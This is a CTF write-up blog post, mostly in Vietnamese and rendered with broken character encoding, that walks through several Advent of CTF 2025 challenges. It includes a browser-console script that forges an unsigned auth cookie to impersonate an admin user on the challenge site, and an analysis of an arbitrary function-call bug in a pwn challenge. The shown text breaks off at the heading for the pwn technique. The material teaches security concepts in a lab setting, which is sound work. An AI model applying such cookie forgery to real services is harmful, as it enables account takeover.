---
title: Advent of CTF 2025
date: 2026-01-31 09:00 +0700
tags: [ctf, web, reversing, pwnable, misc, crypto, forensics]
categories: [CTF Writeups]
author: ZennisKayy
math: true
image: 
  path: /assets/img/Advent-CTF-2025/logo.png
---

> M√¨nh tham gia cu·ªôc thi n√†y cu·ªëi nƒÉm 2025, m·ªôt ph·∫ßn c≈©ng b·∫≠n v√† h∆°i l∆∞·ªùi n√™n ƒë·∫øn b√¢y gi·ªù m·ªõi c√≥ th·ªùi gian vi·∫øt l·∫°i writeup. M·ªôt s·ªë challenge m√¨nh vi·∫øt b·∫±ng ti·∫øng Vi·ªát, m·ªôt s·ªë b·∫±ng ti·∫øng Anh, t√πy theo c·∫£m h·ª©ng l√∫c vi·∫øt. M√¨nh s·∫Ω c·ªë g·∫Øng vi·∫øt chi ti·∫øt nh·∫•t c√≥ th·ªÉ, b·∫°n c√≥ th·ªÉ t√¨m l·∫°i c√°c challenge tr√™n [advent of ctf 2025](https://cyberstudents.net/advent/2025) ƒë·ªÉ tham kh·∫£o th√™m n·∫øu c·∫ßn.

# Advent of CTF 2025

## The Mission Begins

> **Category:** Cryptography
{: .prompt-info }

B√†i n√†y kh√° ƒë∆°n gi·∫£n, cho 1 file `start.txt` ch·ª©a 1 chu·ªói binary, m√¨nh d√πng [CyberChef](https://cyberchef.org/#recipe=From_Binary('Space',8)From_Hex('Auto')From_Base64('A-Za-z0-9%2B/%3D',true,false)&input=MDAxMTAxMDEgMDAxMTEwMDEgMDAxMTAwMTEgMDAxMTAwMTEgMDAxMTAxMDAgMDExMDAxMDEgMDAxMTAxMTAgMDExMDAwMTAgMDAxMTAxMTAgMDAxMTAxMDEgMDAxMTAwMTEgMDAxMTAwMDEgMDAxMTAxMTAgMDAxMTAwMTEgMDAxMTAxMTEgMDExMDAwMDEgMDAxMTAxMTAgMDAxMTAwMTAgMDAxMTAxMDAgMDAxMTAxMTEgMDAxMTAxMDAgMDExMDAxMDAgMDAxMTAxMTEgMDAxMTAxMTEgMDAxMTAxMTAgMDAxMTAwMTAgMDAxMTAxMDEgMDAxMTAxMDAgMDAxMTAxMDAgMDExMDAxMDEgMDAxMTAxMTAgMDAxMTAxMTAgMDAxMTAxMDAgMDExMDAxMTAgMDAxMTAxMDAgMDAxMTAxMTEgMDAxMTAxMDAgMDAxMTAxMTAgMDAxMTAxMDAgMDAxMTAxMDAgMDAxMTAxMDEgMDAxMTAwMTEgMDAxMTAwMTEgMDAxMTAwMDEgMDAxMTAwMTEgMDAxMTEwMDAgMDAxMTAwMTEgMDAxMTAwMTEgMDAxMTAxMDAgMDExMDAxMDAgMDAxMTAxMDAgMDAxMTAxMTAgMDAxMTAwMTEgMDAxMTEwMDEgMDAxMTAxMTAgMDAxMTEwMDAgMDAxMTAxMDEgMDExMDAwMDEgMDAxMTAxMDAgMDAxMTEwMDAgMDAxMTAxMDEgMDAxMTEwMDEgMDAxMTAxMTEgMDExMDAwMDEgMDAxMTAxMDEgMDAxMTAxMDAgMDAxMTAxMTAgMDExMDAwMDEgMDAxMTAxMTAgMDAxMTAxMDAgMDAxMTAxMTAgMDAxMTAxMTAgMDAxMTAxMDAgMDExMDAxMDAgMDAxMTAxMTAgMDExMDAwMDEgMDAxMTAxMDAgMDAxMTAwMDEgMDAxMTAxMTEgMDAxMTEwMDEgMDAxMTAxMDAgMDExMDAxMDEgMDAxMTAxMDEgMDAxMTEwMDAgMDAxMTAwMTEgMDAxMTAwMDAgMDAxMTAwMTEgMDExMDAxMDA) gi·∫£i l·∫ßn l∆∞·ª£t theo th·ª© t·ª± (Binary &rarr; Hex &rarr; Base64) l√† c√≥ ƒë∆∞·ª£c flag.

![Cyberchef challenge Dec 1](/assets/img/Advent-CTF-2025/day1.png){: .mx-auto .d-block }

> **Flag:** `csd{W3lc0m3_8aCK_70_adv3N7_2025}`
{: .prompt-flag }

-----

## The First Strike

> Forensics
{: .prompt-info }

### 1. Wireshark Filter

S·ª≠ d·ª•ng b·ªô l·ªçc hi·ªÉn th·ªã (Display Filter) c·ªßa b·∫°n ƒë·ªÉ ch·ªâ hi·ªÉn th·ªã c√°c s·ª± ki·ªán ƒëƒÉng nh·∫≠p v√† th√†nh c√¥ng:

```
ftp.request.command == "USER" or ftp.request.command == "PASS" or ftp.response.code == 230
```

![image](/assets/img/Advent-CTF-2025/day2.png){: .mx-auto .d-block }

### 2. X√°c ƒë·ªãnh L·∫ßn ƒëƒÉng nh·∫≠p Th√†nh c√¥ng

1.  **S·∫Øp x·∫øp** c√°c g√≥i tin ƒë√£ l·ªçc theo c·ªôt **No.** (S·ªë th·ª© t·ª± g√≥i tin) ƒë·ªÉ ƒë·∫£m b·∫£o ch√∫ng theo ƒë√∫ng tr√¨nh t·ª±.
2.  Cu·ªôn xu·ªëng cu·ªëi danh s√°ch ƒë√£ l·ªçc, t√¨m g√≥i tin c√≥ **Protocol** l√† `FTP` v√† tr∆∞·ªùng **Info/Length** l√† `Response: 230 User logged in.`.

  * **G√≥i tin No. 18464**: `Response: 230 User logged in.`

### 3. T√¨m Th√¥ng tin ƒêƒÉng nh·∫≠p

Ki·ªÉm tra 2 g√≥i tin ngay tr∆∞·ªõc g√≥i `Response 230` ƒë√≥ (s·ª≠ d·ª•ng c·ªôt **No.**):

  * **G√≥i tin No. 18463** (Request PASS): Ch·ª©a m·∫≠t kh·∫©u.
      * `Request: PASS snowball`
      * **Password:** `snowball`
  * **G√≥i tin No. 18461** (Request USER): Ch·ª©a t√™n t√†i kho·∫£n.
      * `Request: USER Elf67`
      * **Username:** `Elf67`


### 4. Flag

Gh√©p t√™n ng∆∞·ªùi d√πng v√† m·∫≠t kh·∫©u theo ƒë·ªãnh d·∫°ng y√™u c·∫ßu:

> **Flag:** `csd{Elf67_snowball}`
{: .prompt-flag }

-----

## Syndicate Infrastructure

**Category:** Miscellaneous
{: .prompt-info }
**Objective:** T√¨m flag ·∫©n gi·∫•u trong c√°c b·∫£n ghi DNS c·ªßa domain `krampus.csd.lol` b·∫±ng c√°ch l·∫ßn theo c√°c manh m·ªëi (breadcrumbs).

### üõ†Ô∏è C√¥ng c·ª• s·ª≠ d·ª•ng

  * `dig` (Domain Information Groper)
  * `base64` (Linux utility)

### Walkthrough

#### B∆∞·ªõc 1: Kh·ªüi ƒë·∫ßu - Ki·ªÉm tra b·∫£n ghi TXT g·ªëc

B·∫Øt ƒë·∫ßu b·∫±ng vi·ªác ki·ªÉm tra b·∫£n ghi TXT c·ªßa domain g·ªëc ƒë·ªÉ t√¨m manh m·ªëi ƒë·∫ßu ti√™n.

```bash
dig krampus.csd.lol TXT +short
```

**K·∫øt qu·∫£:** `"v=spf1 include:_spf.krampus.csd.lol -all"`

> **Manh m·ªëi:** Subdomain `_spf.krampus.csd.lol`.

#### B∆∞·ªõc 2: Ki·ªÉm tra b·∫£n ghi MX

B·∫£n ghi SPF tr·ªè ƒë·∫øn m·ªôt dead-end (kh√¥ng c√≥ th√¥ng tin quan tr·ªçng). Chuy·ªÉn sang ki·ªÉm tra h·∫° t·∫ßng Email (MX Record).

```bash
dig krampus.csd.lol MX +short
```

**K·∫øt qu·∫£:** `10 mail.krampus.csd.lol.`

> **Manh m·ªëi:** Subdomain `mail.krampus.csd.lol`.

#### B∆∞·ªõc 3: Khai th√°c th√¥ng tin t·ª´ DMARC

C√°c mail server th∆∞·ªùng ƒëi k√®m v·ªõi b·∫£n ghi DMARC ƒë·ªÉ b√°o c√°o l·ªói. Ki·ªÉm tra b·∫£n ghi TXT c·ªßa `_dmarc`.

```bash
dig TXT _dmarc.krampus.csd.lol +short
```

**K·∫øt qu·∫£:** `... ruf=mailto:forensics@ops.krampus.csd.lol ...`

> **Manh m·ªëi:** Email b√°o c√°o tr·ªè v·ªÅ `ops.krampus.csd.lol`.

#### B∆∞·ªõc 4: Li·ªát k√™ d·ªãch v·ª• n·ªôi b·ªô (Internal Services)

Ki·ªÉm tra b·∫£n ghi TXT c·ªßa subdomain `ops` v·ª´a t√¨m th·∫•y.

```bash
dig TXT ops.krampus.csd.lol +short
```

**K·∫øt qu·∫£:** `"internal-services: _ldap._tcp... _metrics._tcp.krampus.csd.lol"`

> **Manh m·ªëi:** Ph√°t hi·ªán d·ªãch v·ª• l·∫° l√† `_metrics`.

#### B∆∞·ªõc 5: ƒê·ªãnh v·ªã Host qua b·∫£n ghi SRV

D·ªãch v·ª• `_metrics` s·ª≠ d·ª•ng giao th·ª©c TCP, ta d√πng truy v·∫•n SRV ƒë·ªÉ t√¨m v·ªã tr√≠ m√°y ch·ªß (hostname/port).

```bash
dig SRV _metrics._tcp.krampus.csd.lol +short
```

**K·∫øt qu·∫£:** `0 0 443 beacon.krampus.csd.lol.`

> **Manh m·ªëi:** Hostname `beacon.krampus.csd.lol`.

#### B∆∞·ªõc 6: Gi·∫£i m√£ Config ·∫©n (Base64)

Ki·ªÉm tra TXT record c·ªßa `beacon`.

```bash
dig TXT beacon.krampus.csd.lol +short
```

**K·∫øt qu·∫£:** `"config=ZXhmaWwua3JhbXB1cy5jc2QubG9s=="`
Gi·∫£i m√£ Base64:

```bash
echo "ZXhmaWwua3JhbXB1cy5jc2QubG9s==" | base64 -d
# Output: exfil.krampus.csd.lol
```

> **Manh m·ªëi:** Subdomain `exfil.krampus.csd.lol`.

#### B∆∞·ªõc 7: T√¨m ki·∫øm DKIM Selector

Ki·ªÉm tra TXT record c·ªßa `exfil`.

```bash
dig TXT exfil.krampus.csd.lol +short
```

**K·∫øt qu·∫£:** `"status=active; auth=dkim; selector=syndicate"`

> **Manh m·ªëi:** DKIM Selector l√† `syndicate`.

#### B∆∞·ªõc 8: L·∫•y Flag t·ª´ b·∫£n ghi DKIM Key

Theo chu·∫©n DKIM, public key ƒë∆∞·ª£c l∆∞u t·∫°i `selector._domainkey.domain`. Do kh√¥ng t√¨m th·∫•y tr√™n subdomain `exfil`, ta th·ª≠ truy v·∫•n tr·ª±c ti·∫øp tr√™n domain g·ªëc.

```bash
dig TXT syndicate._domainkey.krampus.csd.lol +short
```

**K·∫øt qu·∫£:** `"v=DKIM1; k=rsa; p=Y3Nke2RuNV9tMTlIVF9CM19LMU5ENF9XME5LeX0="`

#### B∆∞·ªõc 9: Gi·∫£i m√£ Flag

Tr∆∞·ªùng `p` (public key) ch√≠nh l√† Flag ƒë√£ ƒë∆∞·ª£c m√£ h√≥a Base64.

```bash
echo "Y3Nke2RuNV9tMTlIVF9CM19LMU5ENF9XME5LeX0=" | base64 -d
```

> **Flag:** `csd{dn5_m19HT_B3_K1ND4_W0NKy}`
{: .prompt-flag }

![image](/assets/img/Advent-CTF-2025/day3.png){: .mx-auto .d-block }

-----

*Ghi ch√∫: B√†i n√†y y√™u c·∫ßu t∆∞ duy logic v·ªÅ c·∫•u tr√∫c DNS (SPF &rarr; MX &rarr; DMARC &rarr; SRV &rarr; DKIM) thay v√¨ brute-force.*

---

## The Elf's Wager

> **Category:** Reverse Engineering
{: .prompt-info }

ƒê√¢y l√† m·ªôt b√†i RE s·ª≠ d·ª•ng m√£ h√≥a XOR ƒë∆°n gi·∫£n v·ªõi ƒë·ªô d√†i c·ªë ƒë·ªãnh.

### üìù Ph√¢n t√≠ch m√£ gi·∫£

#### 1\. H√†m `UndefinedFunction_00101171` (H√†m Main)

ƒê√¢y l√† h√†m ƒëi·ªÅu khi·ªÉn logic ch√≠nh c·ªßa ch∆∞∆°ng tr√¨nh.

```c
undefined8 UndefinedFunction_00101171(void)
{
    // ... Khai b√°o bi·∫øn
    
    // ... Ki·ªÉm tra Anti-Debug/Tampering (FUN_00101339)
    FUN_00101339(); 

    puts("NPLD Mainframe Authentication");
    __printf_chk(2,"Enter access code: ");
    
    // ƒê·ªçc ƒë·∫ßu v√†o
    pcVar2 = fgets(acStack_50,0x40,stdin);
    
    if (pcVar2 != (char *)0x0) {
        // Lo·∫°i b·ªè k√Ω t·ª± xu·ªëng d√≤ng '\n'
        sVar3 = strcspn(acStack_50,"\n");
        acStack_50[sVar3] = '\0';
        
        // L·∫•y ƒë·ªô d√†i chu·ªói
        sVar3 = strlen(acStack_50);
        
        // KI·ªÇM TRA ƒê·ªò D√ÄI
        if (sVar3 == 0x17) { // 0x17 = 23 (Decimal)
            FUN_00101339();
            
            // G·ªåI H√ÄM KI·ªÇM TRA CH√çNH
            iVar1 = FUN_00101362(acStack_50);
            
            // KI·ªÇM TRA K·∫æT QU·∫¢
            pcVar2 = "Access Denied. Jingle smirks.";
            if (iVar1 != 0) {
                // ƒê·∫¶U V√ÄO ƒê√öNG (FLAG)
                pcVar2 = "Welcome to the mainframe, Operative. Jingle owes the elves a round.";
            }
            puts(pcVar2);
            uVar4 = 0;
            goto LAB_00101229;
        }
        puts("Jingle laughs. Wrong credential length!");
    }
    // ...
}
```

##### üîë Chi ti·∫øt v·ªÅ ƒë·∫ßu v√†o:

  * **ƒê·ªçc chu·ªói:** `fgets(acStack_50, 0x40, stdin);` ƒë·ªçc t·ªëi ƒëa $0x40$ (64) byte v√†o buffer `acStack_50`.
  * **X·ª≠ l√Ω chu·ªói:** Hai d√≤ng sau ƒë·∫£m b·∫£o lo·∫°i b·ªè k√Ω t·ª± `\n` (xu·ªëng d√≤ng) kh·ªèi chu·ªói nh·∫≠p, gi√∫p ƒë·ªô d√†i `strlen()` ch√≠nh x√°c h∆°n.
    ```c
    sVar3 = strcspn(acStack_50,"\n");
    acStack_50[sVar3] = '\0';
    ```
  * **Y√™u c·∫ßu quan tr·ªçng:** ƒê·ªô d√†i chu·ªói nh·∫≠p ph·∫£i b·∫±ng **$0x17$** (23 k√Ω t·ª±). N·∫øu kh√¥ng, ch∆∞∆°ng tr√¨nh in ra "Wrong credential length\!".

#### 2. H√†m `FUN_00101339` (Anti-Tampering)

H√†m n√†y ƒë∆∞·ª£c g·ªçi hai l·∫ßn v√† ki·ªÉm tra m·ªôt gi√° tr·ªã c·ªë ƒë·ªãnh trong b·ªô nh·ªõ:

```c
void FUN_00101339(void)
{
¬† if (DAT_00104008 != -0x21524111) {
¬† ¬† puts("Coal for you! Tampering detected.");
¬† ¬† exit(1);
¬† }
¬† return;
}
```

  * N√≥ ki·ªÉm tra xem gi√° tr·ªã t·∫°i ƒë·ªãa ch·ªâ d·ªØ li·ªáu c·ªë ƒë·ªãnh **`DAT_00104008`** c√≥ ph·∫£i l√† **$-0x21524111$** hay kh√¥ng.
  * ƒê√¢y l√† m·ªôt k·ªπ thu·∫≠t ƒë∆°n gi·∫£n ƒë·ªÉ ki·ªÉm tra xem binary c√≥ b·ªã ch·ªânh s·ª≠a sau khi ƒë∆∞·ª£c compile kh√¥ng. Trong qu√° tr√¨nh gi·∫£i RE, ta ch·ªâ c·∫ßn ƒë·∫£m b·∫£o gi√° tr·ªã n√†y kh√¥ng b·ªã thay ƒë·ªïi.

-----

#### 3. H√†m `FUN_00101362` (H√†m Ki·ªÉm tra Logic)

ƒê√¢y l√† n∆°i ch·ª©a logic ch√≠nh ƒë·ªÉ x√°c minh Access Code.

```c
undefined8 FUN_00101362(long param_1) // param_1 l√† chu·ªói nh·∫≠p v√†o
{
¬† long lVar1;
¬†¬†
¬† lVar1 = 0;
¬† do {
¬† ¬† // Ph√©p ki·ªÉm tra: (K√Ω t·ª± nh·∫≠p [i] XOR 0x42) == Byte m·ª•c ti√™u [i]
¬† ¬† if (((int)*(char *)(param_1 + lVar1) ^ 0x42U) != (uint)(byte)(&DAT_00102110)[lVar1]) {
¬† ¬† ¬† return 0; // Th·∫•t b·∫°i
¬† ¬† }
¬† ¬† lVar1 = lVar1 + 1;
¬† } while (lVar1 != 0x17); // L·∫∑p l·∫°i 23 l·∫ßn
¬† return 1; // Th√†nh c√¥ng
}
```

##### üîë Chi ti·∫øt v·ªÅ logic XOR:

T·∫°i m·ªói l·∫ßn l·∫∑p $i$ (t·ª´ $0$ ƒë·∫øn $22$):

1.  **L·∫•y k√Ω t·ª± nh·∫≠p:** `*(char *)(param_1 + lVar1)`
2.  **L·∫•y Byte m·ª•c ti√™u:** `(byte)(&DAT_00102110)[lVar1]`
3.  **Ph√©p so s√°nh:**
    $$(Input) \oplus 0x42 = TargetByte$$

V√¨ **XOR** l√† m·ªôt ph√©p to√°n t·ª± ƒë·∫£o ng∆∞·ª£c ($A \oplus B = C \implies C \oplus B = A$), c√¥ng th·ª©c ƒë·ªÉ t√¨m Access Code l√†:

$$\text{Access Code}[i] = \text{TargetData}[i] \oplus 0x42$$

![image](/assets/img/Advent-CTF-2025/day4.png){: .mx-auto .d-block }


-----

### Gi·∫£i m√£

#### D·ªØ li·ªáu m·ª•c ti√™u (`TargetData`):

$$\text{TargetData = 21 31 26 39 73 2C 36 72 1D 36 2A 71 1D 2F 76 73 2C 24 30 76 2F 71 3F}$$

**Key XOR:** $0x42$ (Decimal 66)
    
| Target Byte (Hex) | $\oplus$ Key $0x42$ | K·∫øt qu·∫£ (Hex) | K·∫øt qu·∫£ (ASCII) |
| :---------------: | :-----------------: | :-----------: | :-------------: |
|        21         |     $\oplus 42$     |      63       |      **c**      |
|        31         |     $\oplus 42$     |      73       |      **s**      |
|        26         |     $\oplus 42$     |      64       |      **d**      |
|        39         |     $\oplus 42$     |      7B       |      **{**      |
|        73         |     $\oplus 42$     |      31       |      **1**      |
|        2C         |     $\oplus 42$     |      6E       |      **n**      |
|        36         |     $\oplus 42$     |      74       |      **t**      |
|        72         |     $\oplus 42$     |      30       |      **0**      |
|        1D         |     $\oplus 42$     |      5F       |     **\_**      |
|        36         |     $\oplus 42$     |      74       |      **t**      |
|        2A         |     $\oplus 42$     |      68       |      **h**      |
|        71         |     $\oplus 42$     |      33       |      **3**      |
|        1D         |     $\oplus 42$     |      5F       |     **\_**      |
|        2F         |     $\oplus 42$     |      6D       |      **m**      |
|        76         |     $\oplus 42$     |      34       |      **4**      |
|        73         |     $\oplus 42$     |      31       |      **1**      |
|        2C         |     $\oplus 42$     |      6E       |      **n**      |
|        24         |     $\oplus 42$     |      66       |      **f**      |
|        30         |     $\oplus 42$     |      72       |      **r**      |
|        76         |     $\oplus 42$     |      34       |      **4**      |
|        2F         |     $\oplus 42$     |      6D       |      **m**      |
|        71         |     $\oplus 42$     |      33       |      **3**      |
|        3F         |     $\oplus 42$     |      7D       |      **}**      |
    

### **Script**
```python
target_data_hex = "21312639732C36721D362A711D2F76732C2430762F713F"
target_data = bytes.fromhex(target_data_hex)
xor_key = 0x42  # Key (0x42)

flag = ""
for byte in target_data:
    flag_byte = byte ^ xor_key
    flag += chr(flag_byte)

print(flag)
```


> **Flag:** `csd{1nt0_th3_m41nfr4m3}`
{: .prompt-flag }

-----

## Kramazon

> **Category:** Web
{: .prompt-info }

**Technique:** Insecure Cryptography, Cookie Forgery, Broken Authentication  

### M·ª•c ti√™u

H·ªá th·ªëng "Kramazon" cho ph√©p ng∆∞·ªùi d√πng (Elf) t·∫°o v√† ch·ªët ƒë∆°n h√†ng. Tuy nhi√™n, ch·ªâ c√≥ ng∆∞·ªùi d√πng ƒë·∫∑c quy·ªÅn l√† **Santa (User ID: 1)** m·ªõi c√≥ quy·ªÅn ∆∞u ti√™n (Priority) ƒë·ªÉ truy c·∫≠p v√†o "Priority Route Manifest" v√† l·∫•y Flag.

M·ª•c ti√™u: Chi·∫øm quy·ªÅn ƒëi·ªÅu khi·ªÉn phi√™n l√†m vi·ªác c·ªßa Santa ƒë·ªÉ ch·ªët ƒë∆°n h√†ng v·ªõi quy·ªÅn ∆∞u ti√™n.

### Qu√° tr√¨nh Ph√¢n t√≠ch (Reconnaissance)

#### A. Quan s√°t ban ƒë·∫ßu

  * Khi truy c·∫≠p trang ch·ªß, server tr·∫£ v·ªÅ header `Set-Cookie`.
  * Flow b√¨nh th∆∞·ªùng:
    1.  `/create-order`: T·∫°o ƒë∆°n h√†ng (User m·∫∑c ƒë·ªãnh l√† Elf - ID 3921).
    2.  `/finalize`: Ch·ªët ƒë∆°n h√†ng. N·∫øu User ID kh·ªõp v·ªõi Cookie &rarr; Th√†nh c√¥ng.

#### B. Ph√¢n t√≠ch M√£ ngu·ªìn (Source Code Analysis)

Ki·ªÉm tra file `script.js` t·∫£i v·ªÅ t·ª´ Client, ph√°t hi·ªán ƒëo·∫°n code x·ª≠ l√Ω t·∫°o Cookie x√°c th·ª±c (Client-side generation). ƒê√¢y l√† m·ªôt l·ªó h·ªïng nghi√™m tr·ªçng v√¨ logic x√°c th·ª±c n·∫±m ·ªü ph√≠a ng∆∞·ªùi d√πng.

**Logic t·∫°o Cookie:**

```javascript
function forgeCookie(id) {
    const str = id.toString();
    let binary = '';
    for (let i = 0; i < str.length; i++) {
        // Thu·∫≠t to√°n: XOR t·ª´ng k√Ω t·ª± c·ªßa ID v·ªõi key c·ªë ƒë·ªãnh 0x37 (55)
        const xorChar = str.charCodeAt(i) ^ 0x37;
        binary += String.fromCharCode(xorChar);
    }
    // M√£ h√≥a k·∫øt qu·∫£ b·∫±ng Base64
    return btoa(binary);
}
```

  * **L·ªó h·ªïng:** Server tin t∆∞·ªüng ho√†n to√†n v√†o cookie do Client g·ª≠i l√™n m√† kh√¥ng c√≥ ch·ªØ k√Ω b·∫£o m·∫≠t (HMAC/Signature) ƒë·ªÉ ki·ªÉm tra t√≠nh to√†n v·∫πn. B·∫•t k·ª≥ ai bi·∫øt logic XOR c≈©ng c√≥ th·ªÉ t·ª± t·∫°o cookie cho b·∫•t k·ª≥ User ID n√†o.

### Khai th√°c (Exploitation)

Ch√∫ng ta c·∫ßn gi·∫£ m·∫°o User **Santa (ID: 1)**.

#### B∆∞·ªõc 1: T√≠nh to√°n Cookie gi·∫£ m·∫°o

√Åp d·ª•ng thu·∫≠t to√°n c·ªßa server cho ID = 1:

1.  ID: `"1"` (ASCII code: 49).
2.  XOR: `49 ^ 0x37 (55) = 6`.
3.  Character: `String.fromCharCode(6)`.
4.  Base64 Encode: `btoa(...)` &rarr; K·∫øt qu·∫£ l√† **`Bg==`**.

### B∆∞·ªõc 2: Th·ª±c hi·ªán t·∫•n c√¥ng (Attack Script)

S·ª≠ d·ª•ng Console c·ªßa tr√¨nh duy·ªát ƒë·ªÉ th·ª±c hi·ªán to√†n b·ªô quy tr√¨nh: Ghi ƒë√® Cookie &rarr; T·∫°o ƒë∆°n &rarr; Ch·ªët ƒë∆°n &rarr; L·∫•y Flag.

```javascript
(async () => {
    console.log("[*] --- KRAMAZON EXPLOIT START ---");

    // 1. Ghi ƒë√® Cookie Session th√†nh Santa (ID 1)
    // Gi√° tr·ªã 'Bg==' l√† k·∫øt qu·∫£ c·ªßa (ASCII('1') XOR 0x37) sau ƒë√≥ Base64
    document.cookie = "auth=Bg==; path=/; max-age=3600";
    console.log("[+] Cookie forged: auth=Bg== (User: Santa)");

    // 2. T·∫°o ƒë∆°n h√†ng (Create Order)
    // Server ƒë·ªçc cookie 'auth', gi·∫£i m√£ v√† th·∫•y User ID = 1
    console.log("[*] Creating order as Santa...");
    const createRes = await fetch("/create-order", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({}) 
    });
    const order = await createRes.json();
    console.log(`[+] Order Created: ${order.order_id}`);

    // ƒê·ª£i server x·ª≠ l√Ω backend
    await new Promise(r => setTimeout(r, 1000));

    // 3. Ch·ªët ƒë∆°n h√†ng (Finalize)
    // G·ª≠i k√®m user: 1 ƒë·ªÉ kh·ªõp v·ªõi cookie
    console.log("[*] Finalizing order...");
    const finalRes = await fetch("/finalize", {
        method: "POST", 
        headers: {"Content-Type":"application/json"},
        body: JSON.stringify({ order: order.order_id, user: 1 }) 
    });
    
    const finalJson = await finalRes.json();
    
    // 4. Tr√≠ch xu·∫•t Flag
    if (finalJson.success && finalJson.privileged) {
        console.log("[!] SUCCESS! Santa privileges confirmed.");
        console.log(`[+] Flag Part 1: ${finalJson.flag_hint}`);
        
        // L·∫•y ph·∫ßn c√≤n l·∫°i t·ª´ ƒë∆∞·ªùng d·∫´n ·∫©n
        const hiddenRoute = finalJson.internal_route; // "/priority/manifest/route-2025-SANTA.txt"
        console.log(`[*] Fetching hidden manifest from: ${hiddenRoute}`);
        
        const manifestRes = await fetch(hiddenRoute);
        const manifestText = await manifestRes.text();
        
        console.log(`${manifestText}`); 
    } else {
        console.error("[-] Exploit failed.");
        console.log(finalJson);
    }
})();
```

### Result

Sau khi ch·∫°y script:

1.  **Response JSON:**
    ```json
    {
      "success": true,
      "privileged": true,
      "message": "Order finalized with Santa-level priority!",
      "internal_route": "/priority/manifest/route-2025-SANTA.txt",
      "flag_hint": "flag{npld_async_cookie_"
    }
    ```
2.  **Manifest File Content:** (V√≠ d·ª• gi·∫£ ƒë·ªãnh d·ª±a tr√™n output) `forgery_master}`

> **Flag:** `csd{npld_async_callback_idor_mastery}`
{: .prompt-flag }

### Lessons Learned

  * **Kh√¥ng bao gi·ªù** th·ª±c hi·ªán logic x√°c th·ª±c ho·∫∑c ph√¢n quy·ªÅn ·ªü ph√≠a Client (Frontend/Javascript).
  * Cookie ch·ª©a th√¥ng tin ƒë·ªãnh danh (Identity) ph·∫£i ƒë∆∞·ª£c k√Ω (Signed) b·ªüi Server (v√≠ d·ª•: JWT ho·∫∑c Signed Cookies) ƒë·ªÉ ngƒÉn ch·∫∑n vi·ªác ch·ªânh s·ª≠a.
  * S·ª≠ d·ª•ng thu·∫≠t to√°n m√£ h√≥a y·∫øu (nh∆∞ XOR ƒë∆°n gi·∫£n) kh√¥ng c√≥ t√°c d·ª•ng b·∫£o m·∫≠t.

---

## KDNU-3B

> **Category:** Pwnable
{: .prompt-info }

### 1. Ph√¢n t√≠ch Kh√°i qu√°t (Initial Triage)

| Thu·ªôc t√≠nh | Gi√° tr·ªã               | √ù nghƒ©a                                                                   |
| :--------- | :-------------------- | :------------------------------------------------------------------------ |
| **Arch**   | `amd64-64-little`     | Ch∆∞∆°ng tr√¨nh 64-bit.                                                      |
| **RELRO**  | `Partial RELRO`       | Kh√¥ng quan tr·ªçng l·∫Øm.                                                     |
| **Stack**  | `Canary found`        | NgƒÉn ch·∫∑n Buffer Overflow tr√™n stack.                                     |
| **NX**     | `NX enabled`          | Kh√¥ng th·ªÉ th·ª±c thi code tr√™n stack (Shellcode tr√™n stack b·ªã v√¥ hi·ªáu h√≥a). |
| **PIE**    | **`No PIE`**          | **ƒê·ªãa ch·ªâ c√°c h√†m l√† c·ªë ƒë·ªãnh** (r·∫•t quan tr·ªçng cho Pwn).                  |
| **Linked** | **Statically linked** | **L√Ω do c√≥ h√†ng ng√†n h√†m r√°c** (`a`, `b`, `qsort`,...).                   |

**K·∫øt lu·∫≠n quan tr·ªçng:**
*   File ƒë∆∞·ª£c bi√™n d·ªãch tƒ©nh, n√™n b·ªè qua h·∫ßu h·∫øt c√°c h√†m r√°c c·ªßa `libc`.
*   **Kh√¥ng PIE** l√† ƒëi·ªÉm y·∫øu ch√≠ m·∫°ng: Ch√∫ng ta bi·∫øt ch√≠nh x√°c ƒë·ªãa ch·ªâ c·ªßa m·ªçi th·ª© trong b·ªô nh·ªõ.
*   `Canary` v√† `NX` ngƒÉn ch·∫∑n c√°c ki·ªÉu t·∫•n c√¥ng stack buffer overflow truy·ªÅn th·ªëng.

### 2. T√¨m ki·∫øm L·ªó h·ªïng (Vulnerability Analysis - H√†m `main`)

Code C c·ªßa `main`:
```c
iVar1 = __isoc99_scanf(&DAT_0049e0bf,&local_20); // DAT_0049e0bf l√† "%lx"
if (iVar1 == 1) {
    local_18 = local_20;
    (*local_20)();  // <--- L·ªñI T·∫†I ƒê√ÇY (Vulnerability)
}
```
*   H√†m `__isoc99_scanf` v·ªõi format string **`%lx`** (Load eXtra - ƒë·ªçc m·ªôt gi√° tr·ªã 64-bit kh√¥ng d·∫•u d∆∞·ªõi d·∫°ng Hex) ƒë·ªçc input c·ªßa ng∆∞·ªùi d√πng v√† l∆∞u v√†o bi·∫øn `local_20`.
*   Sau ƒë√≥, ch∆∞∆°ng tr√¨nh th·ª±c hi·ªán m·ªôt l·ªánh g·ªçi h√†m gi√°n ti·∫øp: `(*local_20)()` (ho·∫∑c `CALL RAX` trong Assembly, v√¨ `local_20` ƒë∆∞·ª£c ƒë·∫∑t trong thanh ghi `RAX`).

**L·ªó h·ªïng:** Ch∆∞∆°ng tr√¨nh cho ph√©p ng∆∞·ªùi d√πng **ƒëi·ªÅu khi·ªÉn tr·ª±c ti·∫øp ƒë·ªãa ch·ªâ `RIP`** (Instruction Pointer) b·∫±ng c√°ch nh·∫≠p ƒë·ªãa ch·ªâ c·ªßa h√†m mu·ªën ch·∫°y.

### 3. Ph√¢n t√≠ch M·ª•c ti√™u (Goal Analysis - H√†m `nav_core`)

M·ª•c ti√™u l√† l·∫•y Flag/Manifest, th∆∞·ªùng n·∫±m ·ªü kh·ªëi `if` b·ªã che gi·∫•u:
```c
void nav_core(int param_1) {
  if (param_1 == 0xc0c0a) { // <-- ƒêi·ªÅu ki·ªán
    // ... code ƒë·ªçc file "manifest.bin" v√† in ra ...
  }
}
```
V·∫•n ƒë·ªÅ: Khi nh·∫£y t·ª´ `main` sang `nav_core`, ch√∫ng ta kh√¥ng ƒëi·ªÅu khi·ªÉn ƒë∆∞·ª£c thanh ghi **`RDI`** (tham s·ªë ƒë·∫ßu ti√™n `param_1` trong x64) ƒë·ªÉ n√≥ b·∫±ng `0xc0c0a`.

### 4. K·ªπ thu·∫≠t t·∫•n c√¥ng: Ret2plt (ho·∫∑c Ret2Text) + Jump Bypass
